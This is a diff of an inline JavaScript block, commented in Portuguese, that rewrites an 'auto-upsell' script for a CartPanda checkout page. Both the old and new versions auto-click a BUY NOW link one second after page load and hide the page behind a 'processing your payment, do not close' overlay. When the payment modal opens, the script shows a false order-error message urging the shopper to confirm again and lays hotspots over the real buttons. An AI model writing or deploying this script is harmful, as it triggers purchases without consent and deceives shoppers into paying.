@@ -15,161 +15,162 @@
             
 <script>
 (function() {
-  // 1) Inicia tudo no DOMContentLoaded
-  document.addEventListener('DOMContentLoaded', init);
-
-  function init() {
-    const overlay = createOverlay();
-    setupAutoClick();
-    observeModal(overlay);
-  }
-
-  // 2) Cria o overlay full-screen com spinner e mensagens
-  function createOverlay() {
-    // Injeta CSS dinamicamente
+  /** Injeta dinamicamente o CSS para overlay, spinner e mensagens */
+  function injectStyles() {
     const style = document.createElement('style');
-    style.innerHTML = `
-      #customOverlay {
+    style.textContent = `
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+      #custom-overlay {
         position: fixed;
-        top: 0; left: 0;
-        width: 100vw; height: 100vh;
-        background: rgba(255,255,255,0.95);
-        z-index: 999999;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0,0,0,0.6);
+        z-index: 100000;
         display: flex;
         flex-direction: column;
         justify-content: center;
         align-items: center;
-        font-family: Arial, sans-serif;
-        text-align: center;
       }
-      #customOverlay .spinner {
-        border: 8px solid #f3f3f3;
-        border-top: 8px solid #3498db;
+      #custom-overlay .custom-spinner {
+        border: 6px solid rgba(0,0,0,0.1);
+        border-top: 6px solid #333;
         border-radius: 50%;
-        width: 60px; height: 60px;
+        width: 60px;
+        height: 60px;
         animation: spin 1s linear infinite;
         margin-bottom: 20px;
       }
-      @keyframes spin {
-        from { transform: rotate(0deg); }
-        to   { transform: rotate(360deg); }
-      }
-      #customOverlay .message {
+      #custom-overlay .custom-message {
+        color: #fff;
         font-size: 1.2em;
+        text-align: center;
         margin: 5px 0;
       }
     `;
     document.head.appendChild(style);
+  }
 
-    // Cria o overlay
+  /** Cria o overlay full-screen com spinner e mensagens iniciais */
+  function createOverlay() {
+    injectStyles();
     const overlay = document.createElement('div');
-    overlay.id = 'customOverlay';
-    overlay.innerHTML = `
-      <div class="spinner"></div>
-      <div class="message">NÃO FECHE NEM ATUALIZE A PÁGINA!</div>
-      <div class="message">PROCESSANDO SEU PAGAMENTO</div>
-    `;
-    // Bloqueia interações inicialmente
-    overlay.style.pointerEvents = 'auto';
+    overlay.id = 'custom-overlay';
+
+    const spinner = document.createElement('div');
+    spinner.className = 'custom-spinner';
+    overlay.appendChild(spinner);
+
+    const msg1 = document.createElement('p');
+    msg1.className = 'custom-message';
+    msg1.textContent = 'NÃO FECHE NEM ATUALIZE A PÁGINA!';
+    overlay.appendChild(msg1);
+
+    const msg2 = document.createElement('p');
+    msg2.className = 'custom-message';
+    msg2.textContent = 'PROCESSANDO SEU PAGAMENTO';
+    overlay.appendChild(msg2);
+
     document.body.appendChild(overlay);
     return overlay;
   }
 
-  // 3) Clique automático no BUY NOW após 1 segundo
-  function setupAutoClick() {
-    setTimeout(() => {
-      const buyLink = document.querySelector('a.cta-button[href*="accepted=yes"]');
-      if (buyLink) {
-        buyLink.click();
-      } else {
-        console.warn('Auto-upsell: botão BUY NOW não encontrado');
-      }
-    }, 1000);
+  /** Dispara automaticamente o clique no botão BUY NOW após 1s */
+  function autoClickBuyNow() {
+    const link = document.querySelector('a.cta-button[href*="accepted=yes"]');
+    if (link) {
+      setTimeout(() => link.click(), 1000);
+    } else {
+      console.warn('Botão BUY NOW não encontrado.');
+    }
   }
 
-  // 4) Observa adição do modal da CartPanda
-  function observeModal(overlay) {
+  /** Observa o DOM e chama callback assim que o modal da CartPanda aparece */
+  function waitForModal(callback) {
     const observer = new MutationObserver((mutations, obs) => {
-      for (const m of mutations) {
-        for (const node of m.addedNodes) {
-          if (
-            node.nodeType === 1 &&
-            (node.id === 'cartpanda-modal-container' || node.classList.contains('cartpanda-modal'))
-          ) {
-            obs.disconnect();
-            enterErrorState(overlay);
-            return;
-          }
-        }
+      const modal = document.getElementById('cartpanda-modal-container')
+                 || document.querySelector('.cartpanda-modal');
+      if (modal) {
+        obs.disconnect();
+        callback(modal);
       }
     });
     observer.observe(document.body, { childList: true, subtree: true });
   }
 
-  // 5) Transição para estado de erro: troca conteúdo e adiciona falsos botões
-  function enterErrorState(overlay) {
-    // Permite que cliques passem para os falsos botões
-    overlay.style.pointerEvents = 'none';
-    // Substitui conteúdo pelo texto de erro
-    overlay.innerHTML = `
-      <div class="message">
-        HOUVE UM ERRO EM SEU PEDIDO,<br>
-        CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO
-      </div>
-    `;
-    placeFakeButtons();
-  }
+  /** Cria hotspots transparentes sobre os botões “Yes” e “No” */
+  function placeHotspots() {
+    const btnClose   = document.getElementById('cartpanda-close-modal-btn');
+    const btnConfirm = document.getElementById('cartpanda-payment-confirmation');
+    if (!btnClose || !btnConfirm) {
+      console.warn('Botões de confirmação ou fechamento não encontrados.');
+      return;
+    }
 
-  // 6) Cria “fake buttons” sobre os originais, capta e repassa o clique
-  function placeFakeButtons() {
-    const configs = [
-      { id: 'cartpanda-close-modal-btn', label: 'NÃO, OBRIGADO' },
-      { id: 'cartpanda-payment-confirmation', label: 'CONFIRMAR' }
-    ];
+    const hotspots = [];
+    // configurações iniciais para o hotspot
+    const baseZ = 100001;
 
-    configs.forEach(cfg => {
-      const realBtn = document.getElementById(cfg.id);
-      if (!realBtn) {
-        console.warn(`Auto-upsell: botão ${cfg.id} não encontrado`);
-        return;
-      }
-
-      const fake = document.createElement('button');
-      fake.textContent = cfg.label;
-      Object.assign(fake.style, {
+    [ { btn: btnClose }, { btn: btnConfirm } ].forEach((item, idx) => {
+      const rect = item.btn.getBoundingClientRect();
+      const hs = document.createElement('div');
+      Object.assign(hs.style, {
         position: 'fixed',
-        cursor: 'pointer',
-        fontSize: '1em',
-        fontFamily: 'Arial, sans-serif',
-        background: 'rgba(0,0,0,0.05)',
-        border: '2px dashed #333',
-        color: '#333',
-        zIndex: 1000000
+        top:    rect.top + 'px',
+        left:   rect.left + 'px',
+        width:  rect.width + 'px',
+        height: rect.height + 'px',
+        background: 'transparent',
+        pointerEvents: 'none',
+        zIndex: baseZ + idx
       });
-      document.body.appendChild(fake);
+      document.body.appendChild(hs);
+      hotspots.push({ btn: item.btn, hs });
+    });
 
-      function update() {
-        const r = realBtn.getBoundingClientRect();
-        Object.assign(fake.style, {
-          top:    `${r.top}px`,
-          left:   `${r.left}px`,
-          width:  `${r.width}px`,
-          height: `${r.height}px`,
-          lineHeight: `${r.height}px`,
-          textAlign: 'center'
-        });
-      }
-      update();
-      window.addEventListener('resize', update);
-
-      fake.addEventListener('click', e => {
-        e.preventDefault();
-        e.stopPropagation();
-        realBtn.click();
+    // atualiza posições em caso de resize
+    window.addEventListener('resize', () => {
+      hotspots.forEach(({ btn, hs }) => {
+        const r = btn.getBoundingClientRect();
+        hs.style.top    = r.top + 'px';
+        hs.style.left   = r.left + 'px';
+        hs.style.width  = r.width + 'px';
+        hs.style.height = r.height + 'px';
       });
     });
   }
 
+  /** Ao detectar o modal, troca o overlay para estado de erro e coloca hotspots */
+  function onModalDetected(modal) {
+    const overlay = document.getElementById('custom-overlay');
+    if (!overlay) return;
+
+    // limpa spinner e mensagens
+    overlay.innerHTML = '';
+
+    // exibe mensagem de erro
+    const err = document.createElement('p');
+    err.className = 'custom-message';
+    err.textContent = 'HOUVE UM ERRO EM SEU PEDIDO, CONFIRME NOVAMENTE CLICANDO NO BOTÃO ABAIXO';
+    overlay.appendChild(err);
+
+    // libera interação (pass-through)
+    overlay.style.pointerEvents = 'none';
+
+    // posiciona hotspots nos botões reais
+    placeHotspots();
+  }
+
+  // Integração no fluxo de página
+  document.addEventListener('DOMContentLoaded', () => {
+    createOverlay();
+    autoClickBuyNow();
+    waitForModal(onModalDetected);
+  });
 })();
 </script>
 
